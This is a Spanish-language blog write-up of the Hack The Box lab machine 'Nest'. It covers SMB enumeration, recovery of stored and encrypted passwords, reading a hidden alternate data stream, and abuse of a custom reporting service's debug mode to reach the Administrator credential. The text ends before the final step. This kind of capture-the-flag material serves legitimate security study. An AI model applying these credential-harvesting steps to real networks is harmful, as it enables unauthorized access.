<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Hack The Box - Nest :: sckull — TryHackMe, HackTheBox, CTF Writeups</title>    
  
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">

<meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Nombre Nest     OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.178   Maker VbScrub    MASSCAN &amp;amp; NMAP Escaneo de puertos tcp/udp y servicios con masscan y nmap, encontramos el puerto samba (445) y el puerto 2386 abiertos.
Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-01-29 04:56:39 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 4386/tcp on 10."/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="https://sckull.github.io/posts/nest/" />


<link rel="stylesheet" href="https://sckull.github.io/assets/style.css">


<link rel="stylesheet" href="https://sckull.github.io/style.css">


<link rel="shortcut icon" href="https://sckull.github.io/img/favicon.png">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="https://kit.fontawesome.com/57784fec54.js" crossorigin="anonymous"></script>


<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="Hack The Box - Nest :: sckull — TryHackMe, HackTheBox, CTF Writeups" />
<meta name="twitter:description" content="Nombre Nest     OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.178   Maker VbScrub    MASSCAN &amp;amp; NMAP Escaneo de puertos tcp/udp y servicios con masscan y nmap, encontramos el puerto samba (445) y el puerto 2386 abiertos.
Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-01-29 04:56:39 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 4386/tcp on 10." />
<meta name="twitter:site" content="https://sckull.github.io/" />
<meta name="twitter:creator" content="sckull" />
<meta name="twitter:image" content="https://sckull.github.io/image/htb/nest/cover.png">





<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Hack The Box - Nest :: sckull — TryHackMe, HackTheBox, CTF Writeups">
<meta property="og:description" content="Nombre Nest     OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.178   Maker VbScrub    MASSCAN &amp;amp; NMAP Escaneo de puertos tcp/udp y servicios con masscan y nmap, encontramos el puerto samba (445) y el puerto 2386 abiertos.
Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-01-29 04:56:39 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 4386/tcp on 10." />
<meta property="og:url" content="https://sckull.github.io/posts/nest/" />
<meta property="og:site_name" content="Hack The Box - Nest" />
<meta property="og:image" content="https://sckull.github.io/image/htb/nest/cover.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />


<script type="application/ld+json">
    {
        "@context" : "http://schema.org",
        "@type" : "BlogPosting",
        "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https://sckull.github.io/"
        },
        "articleSection" : "posts",
        "name" : "Hack The Box - Nest",
        "headline" : "Hack The Box - Nest",
        "description" : "Nombre Nest     OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.178   Maker VbScrub    MASSCAN &amp; NMAP Escaneo de puertos tcp/udp y servicios con masscan y nmap, encontramos el puerto samba (445) y el puerto 2386 abiertos.
Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-01-29 04:56:39 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 4386/tcp on 10.",
        "inLanguage" : "en-US",
        "author" : "",
        "creator" : "",
        "publisher": "",
        "accountablePerson" : "",
        "copyrightHolder" : "",
        "copyrightYear" : "2020",
        "datePublished": "2020-06-04 00:00:00 &#43;0000 UTC",
        "dateModified" : "2020-06-04 00:00:00 &#43;0000 UTC",
        "url" : "https://sckull.github.io/posts/nest/",
        "wordCount" : "2307",
        "keywords" : [ "hackthebox","windows","writeup","walkthrough","Blog" ]
    }
    </script>


<meta property="article:published_time" content="2020-06-04 00:00:00 &#43;0000 UTC" />




<a name="top"></a>
</head>

<body class="dark-theme">
  
<div class="container">
  <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
    
      
        
                   

          

          

          
            <li><a href="/about">About</a></li>
          

        
      
        
                   

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

        
      
        
                   

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

        
      
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        

          

          

          
            <li><a href="/about">About</a></li>
          

      
    
      
        

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

      
    
      
        

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      
    </span>
  </span>
  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
</header>

  
  <div class="content">    
    

  <div class="post">
    <h2 class="post-title">Hack The Box - Nest</h2>
    <div class="post-meta">
      
        <span class="post-date">
          <i class="fas fa-calendar-week"></i>
            Thursday, Jun 4, 2020
        </span>
      
      <span class="post-author">— Written by sckull</span>
      
        <span class="post-read-time">— 11 min read</span>
      
    </div>
        
    
      <span class="post-tags">
        
         <a class="button-tag" href="https://sckull.github.io/tags/hackthebox/"><li class="fa fa-tag"></li> hackthebox</a>&nbsp;
        
         <a class="button-tag" href="https://sckull.github.io/tags/windows/"><li class="fa fa-tag"></li> windows</a>&nbsp;
        
         <a class="button-tag" href="https://sckull.github.io/tags/writeup/"><li class="fa fa-tag"></li> writeup</a>&nbsp;
        
         <a class="button-tag" href="https://sckull.github.io/tags/walkthrough/"><li class="fa fa-tag"></li> walkthrough</a>&nbsp;
        
      </span>
    

    
      
        <img src="https://sckull.github.io/posts/nest/../../image/htb/nest/cover.png" class="post-cover center" />
      
      <hr />
     
    

    <div class="contenido">
      <h2>Contenido</h2>
      <nav id="TableOfContents">
<ul>
<li>
<ul>
<li><a href="#masscan-nmap">MASSCAN &amp; NMAP</a></li>
<li><a href="#smbclient">SMBCLIENT</a></li>
<li><a href="#user-c-smith">USER - C.Smith</a></li>
<li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a>
<ul>
<li><a href="#hqk-reporting-service-v1-2-puerto-4386">HQK Reporting Service V1.2 - Puerto 4386</a></li>
<li><a href="#dnspy-hqkldap-exe">DNSPY - HqkLdap.exe</a></li>
<li><a href="#psexec">PSEXEC</a></li>
</ul></li>
</ul></li>
</ul>
</nav>
    </div>

    <div class="post-content">      
      

<table>
<thead>
<tr>
<th>Nombre</th>
<th>Nest</th>
</tr>
</thead>

<tbody>
<tr>
<td>OS</td>
<td>Windows</td>
</tr>

<tr>
<td>Puntos</td>
<td>20</td>
</tr>

<tr>
<td>Dificultad</td>
<td>Facil</td>
</tr>

<tr>
<td>IP</td>
<td>10.10.10.178</td>
</tr>

<tr>
<td>Maker</td>
<td><a href="https://www.hackthebox.eu/home/users/profile/158833">VbScrub</a></td>
</tr>
</tbody>
</table>

<h2 id="masscan-nmap">MASSCAN &amp; NMAP</h2>

<p>Escaneo de puertos tcp/udp y servicios con masscan y nmap, encontramos el puerto samba (445) y el puerto 2386 abiertos.</p>

<pre><code class="language-bash">Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-01-29 04:56:39 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 4386/tcp on 10.10.10.178                                  
Discovered open port 445/tcp on 10.10.10.178

# Nmap 7.80 scan initiated Tue Jan 28 22:23:24 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.178
Nmap scan report for 10.10.10.178
Host is up (0.34s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds?
4386/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     Reporting Service V1.2
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     Reporting Service V1.2
|     Unrecognised command
|   Help: 
|     Reporting Service V1.2
|     This service allows users to run queries against databases using the legacy HQK format
|     AVAILABLE COMMANDS ---
|     LIST
|     SETDIR &lt;Directory_Name&gt;
|     RUNQUERY &lt;Query_ID&gt;
|     DEBUG &lt;Password&gt;
|_    HELP &lt;Command&gt;

... [snip] ...

Host script results:
|_clock-skew: 1m15s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-01-29T04:29:38
|_  start_date: 2020-01-29T03:11:05

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan 28 22:29:02 2020 -- 1 IP address (1 host up) scanned in 338.05 seconds
</code></pre>

<h2 id="smbclient">SMBCLIENT</h2>

<p>Listamos los SHARENAMES de la maquina, vemos que existe Data, Secure$ y Users, en los cuales tenemos acceso.</p>

<pre><code class="language-bash">root@aoiri:~/htb/nest# smbclient -L 10.10.10.178
Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Data            Disk      
	IPC$            IPC       Remote IPC
	Secure$         Disk      
	Users           Disk      
SMB1 disabled -- no workgroup available
</code></pre>

<p>Utilizamos el SHARENAME Data con un usuario &lsquo;anonimo&rsquo; y sin contraseña para enumerar los archivos, encontramos dentro de Shared dos archivos de texto.</p>

<pre><code class="language-bash">root@aoiri:~/htb/nest# smbclient \\\\10.10.10.178\\Data
Enter WORKGROUP\root's password: 
Try &quot;help&quot; to get a list of possible commands.
smb: \&gt; dir
  .                                   D        0  Wed Aug  7 16:53:46 2019
  ..                                  D        0  Wed Aug  7 16:53:46 2019
  IT                                  D        0  Wed Aug  7 16:58:07 2019
  Production                          D        0  Mon Aug  5 15:53:38 2019
  Reports                             D        0  Mon Aug  5 15:53:44 2019
  Shared                              D        0  Wed Aug  7 13:07:51 2019

		10485247 blocks of size 4096. 6449704 blocks available
smb: \&gt; cd IT
smb: \IT\&gt; dir
NT_STATUS_ACCESS_DENIED listing \IT\*
smb: \IT\&gt; cd ..
smb: \&gt; cd Production
dsmb: \Production\&gt; dir
NT_STATUS_ACCESS_DENIED listing \Production\*
smb: \Production\&gt; cd ..
smb: \&gt; cd Reports
smb: \Reports\&gt; dir
NT_STATUS_ACCESS_DENIED listing \Reports\*
smb: \Reports\&gt; cd ..
smb: \&gt; cd Shared
dsmb: \Shared\&gt; dir
  .                                   D        0  Wed Aug  7 13:07:51 2019
  ..                                  D        0  Wed Aug  7 13:07:51 2019
  Maintenance                         D        0  Wed Aug  7 13:07:32 2019
  Templates                           D        0  Wed Aug  7 13:08:07 2019

		10485247 blocks of size 4096. 6449704 blocks available
smb: \Shared\&gt; cd Maintenance
smb: \Shared\Maintenance\&gt; dir
  .                                   D        0  Wed Aug  7 13:07:32 2019
  ..                                  D        0  Wed Aug  7 13:07:32 2019
  Maintenance Alerts.txt              A       48  Mon Aug  5 17:01:44 2019

		10485247 blocks of size 4096. 6449704 blocks available
smb: \Shared\Maintenance\&gt; get &quot;Maintenance Alerts.txt&quot;
getting file \Shared\Maintenance\Maintenance Alerts.txt of size 48 as Maintenance Alerts.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \Shared\Maintenance\&gt; cd ..\Templates
smb: \Shared\Templates\&gt; dir
  .                                   D        0  Wed Aug  7 13:08:07 2019
  ..                                  D        0  Wed Aug  7 13:08:07 2019
  HR                                  D        0  Wed Aug  7 13:08:01 2019
  Marketing                           D        0  Wed Aug  7 13:08:06 2019

		10485247 blocks of size 4096. 6449704 blocks available
smb: \Shared\Templates\&gt; dir HR
  HR                                  D        0  Wed Aug  7 13:08:01 2019

		10485247 blocks of size 4096. 6449704 blocks available
smb: \Shared\Templates\&gt; cd HR
smb: \Shared\Templates\HR\&gt; dir
  .                                   D        0  Wed Aug  7 13:08:01 2019
  ..                                  D        0  Wed Aug  7 13:08:01 2019
  Welcome Email.txt                   A      425  Wed Aug  7 16:55:36 2019

		10485247 blocks of size 4096. 6449704 blocks available
smb: \Shared\Templates\HR\&gt; get 'Welcome Email.txt'
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Shared\Templates\HR\'Welcome
smb: \Shared\Templates\HR\&gt; get &quot;Welcome Email.txt&quot;
getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Welcome Email.txt (0.6 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \Shared\Templates\HR\&gt; cd ..\Marketing
smb: \Shared\Templates\Marketing\&gt; dir
  .                                   D        0  Wed Aug  7 13:08:06 2019
  ..                                  D        0  Wed Aug  7 13:08:06 2019

		10485247 blocks of size 4096. 6449704 blocks available
smb: \Shared\Templates\Marketing\&gt; 
</code></pre>

<p>Los archivos que encontramos son archivos de texto que contienen notas, en una de ellas encontramos las credenciales de uno de los usuarios de la maquina.</p>

<p>Maintenance Alerts.txt:</p>

<pre><code>There is currently no scheduled maintenance work
</code></pre>

<p>Welcome Email.txt:</p>

<pre><code class="language-bash">We would like to extend a warm welcome to our newest member of staff, &lt;FIRSTNAME&gt; &lt;SURNAME&gt;

You will find your home folder in the following location: 
\\HTB-NEST\Users\&lt;USERNAME&gt;

If you have any issues accessing specific services or workstations, please inform the 
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019


Thank you
HR
</code></pre>

<h2 id="user-c-smith">USER - C.Smith</h2>

<p>Utilizamos las credenciales para enumerar los SHARENAME que estan disponibles en la maquina, en un directorio encontramos un archivo XML <code>RU_config.xml</code> el cual contiene credenciales especificamente de <strong>C.Smith</strong>.</p>

<pre><code class="language-bash">\\\\10.10.10.178\\Data
smb: \IT\Configs\&gt; cd &quot;RU Scanner&quot;
smb: \IT\Configs\RU Scanner\&gt; dir
  .                                   D        0  Wed Aug  7 14:01:13 2019
  ..                                  D        0  Wed Aug  7 14:01:13 2019
  RU_config.xml                       A      270  Thu Aug  8 13:49:37 2019

		10485247 blocks of size 4096. 6449668 blocks available
smb: \IT\Configs\RU Scanner\&gt; get RU_config.xml 
getting file \IT\Configs\RU Scanner\RU_config.xml of size 270 as RU_config.xml (0.2 KiloBytes/sec) (average 3.4 KiloBytes/sec)
</code></pre>

<p>RU_config.xml:</p>

<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;ConfigFile xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;
  &lt;Port&gt;389&lt;/Port&gt;
  &lt;Username&gt;c.smith&lt;/Username&gt;
  &lt;Password&gt;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&lt;/Password&gt;
&lt;/ConfigFile&gt;
</code></pre>

<p>Tambien encontramos un proyecto que lleva el nombre de RU, para encontrar el directorio de Carl, enumeramos el SHARENAME Data en el cual encontramos un archivo xml en donde se describe un &ldquo;archivo temporal&rdquo; en <code>\Secure$\IT\Carl\Temp.txt</code> el cual no existe.</p>

<pre><code class="language-bash">smb: \IT\Configs\NotepadPlusPlus\&gt; dir
  .                                   D        0  Wed Aug  7 13:31:37 2019
  ..                                  D        0  Wed Aug  7 13:31:37 2019
  config.xml                          A     6451  Wed Aug  7 17:01:25 2019
  shortcuts.xml                       A     2108  Wed Aug  7 13:30:27 2019

		10485247 blocks of size 4096. 6449680 blocks available
smb: \IT\Configs\NotepadPlusPlus\&gt; get config.xml
getting file \IT\Configs\NotepadPlusPlus\config.xml of size 6451 as config.xml (7.7 KiloBytes/sec) (average 7.7 KiloBytes/sec)
smb: \IT\Configs\NotepadPlusPlus\&gt; exit
root@aoiri:~/htb/nest# tail config.xml 
        &lt;Find name=&quot;redeem on&quot; /&gt;
        &lt;Find name=&quot;192&quot; /&gt;
        &lt;Replace name=&quot;C_addEvent&quot; /&gt;
    &lt;/FindHistory&gt;
    &lt;History nbMaxFile=&quot;15&quot; inSubMenu=&quot;no&quot; customLength=&quot;-1&quot;&gt;
        &lt;File filename=&quot;C:\windows\System32\drivers\etc\hosts&quot; /&gt;
        &lt;File filename=&quot;\\HTB-NEST\Secure$\IT\Carl\Temp.txt&quot; /&gt;
        &lt;File filename=&quot;C:\Users\C.Smith\Desktop\todo.txt&quot; /&gt;
    &lt;/History&gt;
&lt;/NotepadPlus&gt;
root@aoiri:~/htb/nest#
</code></pre>

<p>Dicho Directorio nos llevo a encontrar el Proyecto RU.</p>

<pre><code class="language-bash">smb: \IT\Carl\VB Projects\WIP\&gt; dir
  .                                   D        0  Tue Aug  6 08:47:41 2019
  ..                                  D        0  Tue Aug  6 08:47:41 2019
  RU                                  D        0  Fri Aug  9 09:36:45 2019

		10485247 blocks of size 4096. 6449639 blocks available
smb: \IT\Carl\VB Projects\WIP\&gt; mask &quot;&quot;
smb: \IT\Carl\VB Projects\WIP\&gt; recurse ON
smb: \IT\Carl\VB Projects\WIP\&gt; prompt OFF
smb: \IT\Carl\VB Projects\WIP\&gt; mget *
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\ConfigFile.vb of size 772 as ConfigFile.vb (2.2 KiloBytes/sec) (average 2.2 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\Module1.vb of size 279 as Module1.vb (0.8 KiloBytes/sec) (average 1.5 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\Application.Designer.vb of size 441 as Application.Designer.vb (1.2 KiloBytes/sec) (average 1.4 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\Application.myapp of size 481 as Application.myapp (1.5 KiloBytes/sec) (average 1.4 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\AssemblyInfo.vb of size 1163 as AssemblyInfo.vb (1.9 KiloBytes/sec) (average 1.6 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\Resources.Designer.vb of size 2776 as Resources.Designer.vb (7.8 KiloBytes/sec) (average 2.5 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\Resources.resx of size 5612 as Resources.resx (9.3 KiloBytes/sec) (average 3.9 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\Settings.Designer.vb of size 2989 as Settings.Designer.vb (8.6 KiloBytes/sec) (average 4.4 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\Settings.settings of size 279 as Settings.settings (0.8 KiloBytes/sec) (average 4.1 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\RU Scanner.vbproj of size 4828 as RU Scanner.vbproj (13.3 KiloBytes/sec) (average 4.9 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\RU Scanner.vbproj.user of size 143 as RU Scanner.vbproj.user (0.3 KiloBytes/sec) (average 4.4 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\SsoIntegration.vb of size 133 as SsoIntegration.vb (0.4 KiloBytes/sec) (average 4.1 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\Utils.vb of size 4888 as Utils.vb (7.5 KiloBytes/sec) (average 4.5 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner.sln of size 871 as RUScanner.sln (2.3 KiloBytes/sec) (average 4.4 KiloBytes/sec)
</code></pre>

<p>Descargamos el proyecto, analizamos el codigo y vemos que es un proyecto que encripta una contraseña o una string desde un archivo de XML y tambien lo desencripta. Modificamos y ejecutamos el proyecto con el archivo <code>RU_config.xml</code> para obtener la contraseña de C.Smith.</p>

<p>Funcion DecryptString:</p>

<pre><code class="language-vb">Console.WriteLine(&quot;Decrypted Text: &quot;  +Decrypt(EncryptedString, &quot;N3st22&quot;, &quot;88552299&quot;, 2, &quot;464R5DFA5DL6LE28&quot;, 256))
Threading.Thread.Sleep(50000)
</code></pre>

<p>Credenciales:</p>

<pre><code>C.Smit:xRxRxPANCAK3SxRxRx
</code></pre>

<p><img src="../../image/htb/nest/Screenshot_20200129_004302.png" alt="image" /></p>

<p>Utilizamos la contraseña en SAMBA (Users) y logramos leer nuestra flag <strong>user.txt</strong>.</p>

<pre><code class="language-bash">root@aoiri:~/htb/nest/tmp# smbclient \\\\10.10.10.178\\Users -U C.Smith
Enter WORKGROUP\C.Smith's password: 
Try &quot;help&quot; to get a list of possible commands.
smb: \&gt; dir
  .                                   D        0  Sat Jan 25 17:04:21 2020
  ..                                  D        0  Sat Jan 25 17:04:21 2020
  Administrator                       D        0  Fri Aug  9 09:08:23 2019
  C.Smith                             D        0  Sun Jan 26 01:21:44 2020
  L.Frost                             D        0  Thu Aug  8 11:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 11:02:50 2019
  TempUser                            D        0  Wed Aug  7 16:55:56 2019

		10485247 blocks of size 4096. 6449275 blocks available
smb: \&gt; cd C.Smith
smb: \C.Smith\&gt; dir
  .                                   D        0  Sun Jan 26 01:21:44 2020
  ..                                  D        0  Sun Jan 26 01:21:44 2020
  HQK Reporting                       D        0  Thu Aug  8 17:06:17 2019
  user.txt                            A       32  Thu Aug  8 17:05:24 2019

		10485247 blocks of size 4096. 6449275 blocks available
smb: \C.Smith\&gt; get user.txt
getting file \C.Smith\user.txt of size 32 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \C.Smith\&gt; exit
root@aoiri:~/htb/nest/tmp# cat user.txt 
cf71b25404be5d84fd827e05f426e987
root@aoiri:~/htb/nest/tmp#
</code></pre>

<p><img src="../../image/htb/nest/Screenshot_20200129_004636.png" alt="image" /></p>

<h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>

<p>Dentro de la carpeta principal de C.Smith encontramos dos archivos el primero parecia estar vacio <code>Debug Mode Password.txt</code> y el segundo <code>HqkLdap.exe</code> un ejecutable. Al obtener más informacion de este archivo encontramos que tiene <strong>Alternative Data Streams</strong> como en la maquina Dropzone de HackTheBox, obtenemos el archivo y encontramos lo que parece ser una contraseña.</p>

<pre><code class="language-bash">root@aoiri:~/htb# smbclient \\\\10.10.10.178\\Users -U C.Smith #xRxRxPANCAK3SxRxRx
Enter WORKGROUP\C.Smith's password: 
Try &quot;help&quot; to get a list of possible commands.
smb: \&gt; dir
  .                                   D        0  Sat Jan 25 17:04:21 2020
  ..                                  D        0  Sat Jan 25 17:04:21 2020
  Administrator                       D        0  Fri Aug  9 09:08:23 2019
  C.Smith                             D        0  Sun Jan 26 01:21:44 2020
  L.Frost                             D        0  Thu Aug  8 11:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 11:02:50 2019
  TempUser                            D        0  Wed Aug  7 16:55:56 2019

		10485247 blocks of size 4096. 6449700 blocks available
smb: \&gt; cd &quot;C.Smith\HQK Reporting\&quot;
smb: \C.Smith\HQK Reporting\&gt; dir
  .                                   D        0  Thu Aug  8 17:06:17 2019
  ..                                  D        0  Thu Aug  8 17:06:17 2019
  AD Integration Module               D        0  Fri Aug  9 06:18:42 2019
  Debug Mode Password.txt             A        0  Thu Aug  8 17:08:17 2019
  HQK_Config_Backup.xml               A      249  Thu Aug  8 17:09:05 2019

		10485247 blocks of size 4096. 6449700 blocks available
smb: \C.Smith\HQK Reporting\&gt; allinfo &quot;Debug Mode Password.txt&quot;
altname: DEBUGM~1.TXT
create_time:    Thu Aug  8 05:06:12 PM 2019 CST
access_time:    Thu Aug  8 05:06:12 PM 2019 CST
write_time:     Thu Aug  8 05:08:17 PM 2019 CST
change_time:    Thu Aug  8 05:08:17 PM 2019 CST
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes
smb: \C.Smith\HQK Reporting\&gt; get &quot;Debug Mode Password.txt:Password:$DATA&quot;
getting file \C.Smith\HQK Reporting\Debug Mode Password.txt:Password:$DATA of size 15 as Debug Mode Password.txt:Password:$DATA (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \C.Smith\HQK Reporting\&gt; exit
root@aoiri:~/htb# cat Debug\ Mode\ Password.txt\:Password\:\$DATA 
WBQ201953D8w 
root@aoiri:~/htb#
</code></pre>

<p><a href="https://superuser.com/a/1520272"><strong>Data Streams - SAMBA</strong></a></p>

<h3 id="hqk-reporting-service-v1-2-puerto-4386">HQK Reporting Service V1.2 - Puerto 4386</h3>

<p>En el segundo puerto utilizamos telnet para conectarnos, y por lo que parece es un servicio en el cual podemos ejecutar ciertos comandos.</p>

<pre><code class="language-bash">root@aoiri:~/htb/nest# rlwrap telnet 10.10.10.178 4386
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is '^]'.

HQK Reporting Service V1.2

&gt;HELP

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR &lt;Directory_Name&gt;
RUNQUERY &lt;Query_ID&gt;
DEBUG &lt;Password&gt;
HELP &lt;Command&gt;
&gt;
</code></pre>

<p>Enumeramos los querys que existen en el servicio y por lo que parece el servicio utiliza carpetas como directorio y ejecuta los querys (archivos) que existen el directorio, por lo que nos podemos mover a traves de C:\ como si fuera una consola pero con distintos comandos.</p>

<p>Uno de los comandos interesante es el DEBUG ya que al utilizar este comando junto con la contraseña, tenemos nuevos comandos los cuales podemos ejecutar.</p>

<pre><code class="language-bash">&gt;DEBUG WBQ201953D8w

Debug mode enabled. Use the HELP command to view additional commands that are now available
&gt;HELP

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR &lt;Directory_Name&gt;
RUNQUERY &lt;Query_ID&gt;
DEBUG &lt;Password&gt;
HELP &lt;Command&gt;
SERVICE
SESSION
SHOWQUERY &lt;Query_ID&gt;

&gt;SETDIR ..

Current directory set to HQK
&gt;LIST

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  ALL QUERIES
[DIR]  LDAP
[DIR]  Logs
[1]   HqkSvc.exe
[2]   HqkSvc.InstallState
[3]   HQK_Config.xml

Current Directory: HQK
&gt;SHOWQUERY 3

&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;ServiceSettings xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;
  &lt;Port&gt;4386&lt;/Port&gt;
  &lt;DebugPassword&gt;WBQ201953D8w&lt;/DebugPassword&gt;
  &lt;QueryDirectory&gt;C:\Program Files\HQK\ALL QUERIES&lt;/QueryDirectory&gt;
&lt;/ServiceSettings&gt;

&gt;
</code></pre>

<p>Dentro de los directorios encontramos la contraseña del usuario Administrator.</p>

<pre><code class="language-bash">Current Directory: HQK
&gt;SETDIR LDAP

Current directory set to LDAP
&gt;LIST

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[1]   HqkLdap.exe
[2]   Ldap.conf

Current Directory: LDAP
&gt;SHOWQUERY 2

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=

&gt;
</code></pre>

<h3 id="dnspy-hqkldap-exe">DNSPY - HqkLdap.exe</h3>

<p>Utilizamos DNSPY para desensamblar el archivo ejecutable que encontramos, al analizar el codigo vemos que utiliza la misma encriptacion que el proyecto &lsquo;RU Scanner&rsquo; con los mismos parametros.</p>

<p><img src="../../image/htb/nest/Screenshot_20200131_172433.png" alt="image" /></p>

<p>Utilizamos el projecto &lsquo;RU Scanner&rsquo; con los parametros de encriptacion pasando la contraseña de administrador.</p>

